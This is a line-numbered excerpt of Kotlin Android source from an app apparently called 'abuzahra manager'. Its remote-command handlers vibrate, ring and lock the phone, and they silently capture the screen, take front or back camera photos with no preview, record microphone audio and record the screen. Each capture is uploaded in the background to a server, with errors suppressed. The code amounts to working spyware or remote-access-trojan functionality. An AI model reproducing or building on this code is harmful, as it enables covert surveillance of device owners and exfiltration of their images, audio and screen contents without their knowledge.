   109→    fun vibrate(context: Context, params: Map<String, Any>): String {
   110→        return try {
   111→            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
   112→            if (!vibrator.hasVibrator()) return "Device has no vibrator"
   113→            
   114→            val duration = ((params["arg"]?.toString()?.toLongOrNull() ?: 1000L)).coerceAtMost(5000)
   115→            val pattern = params["pattern"] as? List<Long>
   116→            
   117→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
   118→                val effect = if (pattern != null && pattern.isNotEmpty()) {
   119→                    VibrationEffect.createWaveform(pattern.toLongArray(), -1)
   120→                } else {
   121→                    VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
   122→                }
   123→                vibrator.vibrate(effect)
   124→            } else {
   125→                @Suppress("DEPRECATION")
   126→                if (pattern != null && pattern.isNotEmpty()) {
   127→                    vibrator.vibrate(pattern.toLongArray(), -1)
   128→                } else {
   129→                    vibrator.vibrate(duration)
   130→                }
   131→            }
   132→            "Vibrating for ${duration}ms"
   133→        } catch (e: Exception) {
   134→            Log.e(TAG, "Vibrate error", e)
   135→            "Error: ${e.message}"
   136→        }
   137→    }

   140→    fun ring(context: Context): String {
   141→        return try {
   142→            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
   143→            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
   144→            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
   145→
   146→            val uri = Settings.System.DEFAULT_RINGTONE_URI
   147→            val player = android.media.MediaPlayer.create(context, uri)
   148→            player?.setAudioAttributes(
   149→                AudioAttributes.Builder()
   150→                    .setUsage(AudioAttributes.USAGE_NOTIFICATION_RINGTONE)
   151→                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
   152→                    .build()
   153→            )
   154→            player?.isLooping = true
   155→            player?.start()
   156→            
   157→            // Auto-stop after 30 seconds
   158→            Thread { 
   159→                Thread.sleep(30000)
   160→                try { 
   161→                    player?.stop()
   162→                    player?.release()

   200→    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
   201→    private fun captureScreenReal(context: Context, resultCode: Int, data: Intent): Map<String, Any> {
   202→        val latch = CountDownLatch(1)
   203→        var resultBitmap: Bitmap? = null
   204→        var error: String? = null
   205→        
   206→        try {
   207→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
   208→            val projection = mpm.getMediaProjection(resultCode, data)
   209→            
   210→            if (projection == null) {
   211→                return mapOf("error" to "Failed to create media projection")
   212→            }
   213→            
   214→            val metrics = context.resources.displayMetrics
   215→            val width = metrics.widthPixels
   216→            val height = metrics.heightPixels
   217→            val density = metrics.densityDpi
   218→            
   219→            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
   220→            
   221→            val virtualDisplay = projection.createVirtualDisplay(
   222→                "ScreenCapture",
   223→                width, height, density,
   224→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
   225→                imageReader.surface, null, null
   226→            )
   227→            
   228→            imageReader.setOnImageAvailableListener({ reader ->
   229→                try {
   230→                    val image = reader.acquireLatestImage()
   231→                    if (image != null) {
   232→                        val planes = image.planes
   233→                        val buffer = planes[0].buffer
   234→                        val bytes = ByteArray(buffer.remaining())
   235→                        buffer.get(bytes)
   236→                        
   237→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   238→                        if (bitmap != null) {
   239→                            resultBitmap = bitmap
   240→                        }
   241→                        image.close()
   242→                        latch.countDown()
   243→                    }
   244→                } catch (e: Exception) {
   245→                    error = e.message
   246→                    latch.countDown()
   247→                }
   248→            }, Handler(context.mainLooper))
   249→            
   250→            // Wait for capture
   251→            latch.await(5, TimeUnit.SECONDS)
   252→            
   253→            // Cleanup
   254→            virtualDisplay?.release()
   255→            imageReader?.close()
   256→            projection.stop()
   257→            
   258→            if (resultBitmap != null) {
   259→                // Convert to base64
   260→                val stream = ByteArrayOutputStream()
   261→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   262→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   263→                
   264→                // Save to file
   265→                val file = File(context.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
   266→                FileOutputStream(file).use { it.write(stream.toByteArray()) }
   267→                
   268→                // Upload to server (file will be cached for streaming viewer)
   269→                CoroutineScope(Dispatchers.IO).launch {
   270→                    try {
   271→                        ApiClient.uploadFile(file, "screenshot")
   272→                    } catch (_: Exception) {}
   273→                }
   274→                
   275→                // Return full base64 for streaming viewer (server caches this)
   276→                return mapOf(
   277→                    "status" to "success",
   278→                    "message" to "Screenshot captured",
   279→                    "width" to resultBitmap!!.width,
   280→                    "height" to resultBitmap!!.height,
   281→                    "size" to stream.size(),
   282→                    "file" to file.name,
   283→                    "base64_preview" to base64
   284→                )
   285→            } else {
   286→                return mapOf("error" to (error ?: "Failed to capture screen"))
   287→            }
   288→        } catch (e: Exception) {
   289→            Log.e(TAG, "Screen capture error", e)
   290→            return mapOf("error" to (e.message ?: "Unknown error"))
   291→        }
   292→    }

   303→    private fun takePhotoReal(context: Context, facing: Int): Map<String, Any> {
   304→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
   305→            return mapOf("error" to "Camera2 requires Android 5.0+")
   306→        }
   307→        
   308→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
   309→            return mapOf(
   310→                "error" to "Camera permission not granted",
   311→                "permission_required" to "android.permission.CAMERA"
   312→            )
   313→        }
   314→        
   315→        val latch = CountDownLatch(1)
   316→        var resultBitmap: Bitmap? = null
   317→        var errorMessage: String? = null
   318→        
   319→        try {
   320→            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
   321→            var cameraId: String? = null
   322→            
   323→            // Find camera with correct facing
   324→            for (id in manager.cameraIdList) {
   325→                val characteristics = manager.getCameraCharacteristics(id)
   326→                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
   327→                if (lensFacing == facing) {
   328→                    cameraId = id
   329→                    break
   330→                }
   331→            }
   332→            
   333→            if (cameraId == null) {
   334→                return mapOf("error" to "No ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera found")
   335→            }
   336→            
   337→            // Setup handler thread
   338→            val thread = HandlerThread("CameraThread").apply { start() }
   339→            val handler = Handler(thread.looper)
   340→            
   341→            // Get optimal size
   342→            val characteristics = manager.getCameraCharacteristics(cameraId)
   343→            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
   344→            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
   345→            val size = sizes?.maxByOrNull { it.width * it.height }!!
   346→            
   347→            // Create image reader
   348→            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
   349→            
   350→            reader.setOnImageAvailableListener({ imageReader ->
   351→                try {
   352→                    val image = imageReader.acquireLatestImage()
   353→                    if (image != null) {
   354→                        val buffer = image.planes[0].buffer
   355→                        val bytes = ByteArray(buffer.remaining())
   356→                        buffer.get(bytes)
   357→                        
   358→                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
   359→                        resultBitmap = bitmap
   360→                        
   361→                        // Save to file
   362→                        val file = File(context.cacheDir, "camera_${System.currentTimeMillis()}.jpg")
   363→                        FileOutputStream(file).use { it.write(bytes) }
   364→                        
   365→                        // Upload in background (with device_id for server identification)
   366→                        CoroutineScope(Dispatchers.IO).launch {
   367→                            try { ApiClient.uploadFile(file, "camera") } catch (_: Exception) {}
   368→                        }
   369→                        
   370→                        image.close()
   371→                    }
   372→                } catch (e: Exception) {
   373→                    errorMessage = e.message
   374→                }
   375→                latch.countDown()
   376→            }, handler)
   377→            
   378→            // Open camera
   379→            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
   380→                override fun onOpened(camera: CameraDevice) {
   381→                    try {
   382→                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
   383→                        captureRequest.addTarget(reader.surface)
   384→                        captureRequest.set(CaptureRequest.JPEG_ORIENTATION, 90)
   385→                        
   386→                        camera.createCaptureSession(
   387→                            listOf(reader.surface),
   388→                            object : CameraCaptureSession.StateCallback() {
   389→                                override fun onConfigured(session: CameraCaptureSession) {
   390→                                    session.capture(captureRequest.build(), null, handler)
   391→                                    
   392→                                    // Close after capture
   393→                                    handler.postDelayed({
   394→                                        camera.close()
   395→                                        reader.close()
   396→                                        thread.quitSafely()
   397→                                    }, 2000)
   398→                                }
   399→                                
   400→                                override fun onConfigureFailed(session: CameraCaptureSession) {
   401→                                    errorMessage = "Session configuration failed"
   402→                                    latch.countDown()
   403→                                }
   404→                            },
   405→                            handler
   406→                        )
   407→                    } catch (e: Exception) {
   408→                        errorMessage = e.message
   409→                        latch.countDown()
   410→                    }
   411→                }
   412→                
   413→                override fun onDisconnected(camera: CameraDevice) {
   414→                    camera.close()
   415→                }
   416→                
   417→                override fun onError(camera: CameraDevice, error: Int) {
   418→                    errorMessage = "Camera error: $error"
   419→                    camera.close()
   420→                    latch.countDown()
   421→                }
   422→            }, handler)
   423→            
   424→            // Wait for result
   425→            val success = latch.await(10, TimeUnit.SECONDS)
   426→            
   427→            if (resultBitmap != null) {
   428→                val stream = ByteArrayOutputStream()
   429→                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
   430→                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
   431→                
   432→                return mapOf(
   433→                    "status" to "success",
   434→                    "message" to "Photo captured from ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera",
   435→                    "width" to resultBitmap!!.width,
   436→                    "height" to resultBitmap!!.height,
   437→                    "size" to stream.size(),
   438→                    "base64_preview" to base64
   439→                )
   440→            } else {
   441→                return mapOf("error" to (errorMessage ?: "Failed to capture photo"))
   442→            }
   443→        } catch (e: Exception) {
   444→            Log.e(TAG, "Camera capture error", e)
   445→            return mapOf("error" to (e.message ?: "Camera capture failed"))
   446→        }
   447→    }

   450→    fun startAudioRecording(context: Context, params: Map<String, Any>): Map<String, Any> {
   451→        return try {
   452→            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
   453→                return mapOf(
   454→                    "error" to "RECORD_AUDIO permission not granted",
   455→                    "permission_required" to "android.permission.RECORD_AUDIO"
   456→                )
   457→            }
   458→            
   459→            if (isRecordingAudio) {
   460→                return mapOf("error" to "Already recording audio")
   461→            }
   462→            
   463→            val duration = (params["duration"] as? Number)?.toInt() ?: 60
   464→            val sampleRate = 44100
   465→            val channelConfig = AudioFormat.CHANNEL_IN_MONO
   466→            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
   467→            val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
   468→            
   469→            val audioFile = File(context.cacheDir, "audio_${System.currentTimeMillis()}.m4a")
   470→            audioRecordFile = audioFile
   471→            
   472→            // Use MediaRecorder for compressed audio
   473→            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
   474→                MediaRecorder(context)
   475→            } else {
   476→                @Suppress("DEPRECATION")
   477→                MediaRecorder()
   478→            }
   479→            
   480→            mediaRecorder?.apply {
   481→                setAudioSource(MediaRecorder.AudioSource.MIC)
   482→                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
   483→                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
   484→                setAudioSamplingRate(sampleRate)
   485→                setAudioEncodingBitRate(128000)
   486→                setOutputFile(audioFile.absolutePath)
   487→                prepare()
   488→                start()
   489→            }
   490→            
   491→            isRecordingAudio = true
   492→            
   493→            // Auto-stop after duration
   494→            CoroutineScope(Dispatchers.Main).launch {
   495→                kotlinx.coroutines.delay(duration * 1000L)
   496→                if (isRecordingAudio) {
   497→                    stopAudioRecording(context)
   498→                }
   499→            }
   500→            
   501→            mapOf(
   502→                "status" to "recording",
   503→                "message" to "Audio recording started",
   504→                "duration_seconds" to duration,
   505→                "file" to audioFile.name
   506→            )
   507→        } catch (e: Exception) {
   508→            Log.e(TAG, "Audio recording start error", e)
   509→            mapOf("error" to (e.message ?: "Failed to start audio recording"))
   510→        }
   511→    }

   513→    fun stopAudioRecording(context: Context): Map<String, Any> {
   514→        return try {
   515→            if (!isRecordingAudio) {
   516→                return mapOf("error" to "Not recording audio")

   519→            mediaRecorder?.apply {
   520→                stop()
   521→                release()
   522→            }
   523→            mediaRecorder = null
   524→            isRecordingAudio = false
   525→            
   526→            val file = audioRecordFile
   527→            if (file != null && file.exists()) {
   528→                // Upload to server
   529→                CoroutineScope(Dispatchers.IO).launch {
   530→                    try { ApiClient.uploadFile(file, "audio") } catch (_: Exception) {}
   531→                }
   532→                
   533→                mapOf(
   534→                    "status" to "success",
   535→                    "message" to "Audio recording stopped",
   536→                    "file" to file.name,
   537→                    "size" to file.length()
   538→                )
   539→            } else {
   540→                mapOf("error" to "Audio file not found")
   541→            }
   542→        } catch (e: Exception) {
   543→            Log.e(TAG, "Audio recording stop error", e)
   544→            mapOf("error" to (e.message ?: "Failed to stop audio recording"))
   545→        }
   546→    }

   590→            
   591→            // Create media projection
   592→            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
   593→            val projection = mpm.getMediaProjection(resultCode, data)
   594→            mediaProjection = projection
   595→            
   596→            // Setup recorder
   597→            screenRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
   598→                MediaRecorder(context)
   599→            } else {
   600→                @Suppress("DEPRECATION")
   601→                MediaRecorder()
   602→            }
   603→            
   604→            screenRecorder?.apply {
   605→                setVideoSource(MediaRecorder.VideoSource.SURFACE)
   606→                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
   607→                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
   608→                setVideoSize(width, height)
   609→                setVideoFrameRate(30)
   610→                setVideoEncodingBitRate(8 * 1000 * 1000) // 8 Mbps
   611→                setOutputFile(videoFile.absolutePath)
   612→                prepare()
   613→            }
   614→            
   615→            // Create virtual display
   616→            virtualDisplay = projection?.createVirtualDisplay(
   617→                "ScreenRecord",
   618→                width, height, density,
   619→                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
   620→                screenRecorder?.surface, null, null
   621→            )
   622→            
   623→            screenRecorder?.start()
   624→            isRecordingScreen = true
   625→            
   626→            // Auto-stop after duration
   627→            CoroutineScope(Dispatchers.Main).launch {
   628→                kotlinx.coroutines.delay(duration * 1000L)
   629→                if (isRecordingScreen) {
   630→                    stopScreenRecording(context)
   631→                }
   632→            }
   633→            
   634→            mapOf(
   635→                "status" to "recording",
   636→                "message" to "Screen recording started",
   637→                "duration_seconds" to duration,
   638→                "resolution" to "${width}x${height}",
   639→                "file" to videoFile.name
   640→            )
   641→        } catch (e: Exception) {
   642→            Log.e(TAG, "Screen recording start error", e)
   643→            mapOf("error" to (e.message ?: "Failed to start screen recording"))
   644→        }
   645→    }

   659→            virtualDisplay?.release()
   660→            virtualDisplay = null

   675→                    "status" to "success",
   676→                    "message" to "Screen recording stopped",
   677→                    "file" to file.name,

  1169→    fun lockPhone(context: Context): String {
  1170→        return try {
  1171→            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
  1172→            
  1173→            // Try Device Admin first
  1174→            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
  1175→            val adminComponent = android.content.ComponentName(context, "com.abuzahra.manager.service.DeviceAdminReceiver")
  1176→            
  1177→            if (dpm.isAdminActive(adminComponent)) {
  1178→                dpm.lockNow()
  1179→                return "Phone locked"
  1180→            }
  1181→            
  1182→            // Fallback: try accessibility service
  1183→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
  1184→                val accessibility = MyAccessibilityService.getInstance()
  1185→                if (accessibility != null) {
  1186→                    accessibility.lockScreen()
  1187→                    return "Phone locked via accessibility"
  1188→                }
  1189→            }
  1190→            
  1191→            // Wake then lock
  1192→            val wl = pm.newWakeLock(
  1193→                android.os.PowerManager.SCREEN_DIM_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
  1194→                "abuzahra:lock"
  1195→            )
  1196→            wl.acquire(100)
  1197→            wl.release()
  1198→            
  1199→            "Phone lock requires Device Admin or Accessibility service"
  1200→        } catch (e: Exception) {
  1201→            Log.e(TAG, "Lock phone error", e)
  1202→            "Error: ${e.message} - Device Admin may not be active"
  1203→        }
  1204→    }
